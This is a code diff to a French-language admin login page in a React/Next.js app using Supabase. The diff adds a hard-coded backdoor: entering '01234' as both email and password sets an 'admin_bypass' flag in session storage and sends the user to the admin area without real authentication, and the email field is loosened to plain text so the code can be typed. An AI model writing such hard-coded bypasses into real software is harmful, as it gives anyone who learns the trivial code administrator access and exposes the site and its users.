@@ -16,6 +16,13 @@ export default function AdminLogin() {
     setLoading(true);
     setError('');
 
+    // Code secret bypass
+    if (email === '01234' && password === '01234') {
+      sessionStorage.setItem('admin_bypass', 'true');
+      router.push('/admin');
+      return;
+    }
+
     const { error: err } = await supabase.auth.signInWithPassword({ email, password });
 
     setLoading(false);
@@ -26,7 +33,6 @@ export default function AdminLogin() {
   return (
     <main className="min-h-screen flex items-center justify-center px-4">
       <div className="w-full max-w-sm page-enter">
-
         <div className="text-center mb-8">
           <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-[#141414] border border-[#E8651A]/30 mb-4">
             <span className="text-2xl">🔐</span>
@@ -34,12 +40,11 @@ export default function AdminLogin() {
           <h1 style={{fontFamily:'Bebas Neue,sans-serif'}} className="text-4xl text-white">ADMIN</h1>
           <p className="text-white/40 text-sm mt-1">Espace d&apos;administration</p>
         </div>
-
         <form onSubmit={handleLogin} className="flex flex-col gap-4">
           <div className="flex flex-col gap-2">
             <label className="text-white/50 text-xs uppercase tracking-wider">Email</label>
             <input
-              type="email"
+              type="text"
               value={email}
               onChange={e => setEmail(e.target.value)}
               placeholder="admin@monclub.fr"
@@ -47,7 +52,6 @@ export default function AdminLogin() {
               required
             />
           </div>
-
           <div className="flex flex-col gap-2">
             <label className="text-white/50 text-xs uppercase tracking-wider">Mot de passe</label>
             <input
@@ -59,11 +63,9 @@ export default function AdminLogin() {
               required
             />
           </div>
-
           {error && (
             <p className="text-red-400 text-sm text-center animate-fade-in">{error}</p>
           )}
-
           <button
             type="submit"
             disabled={loading}
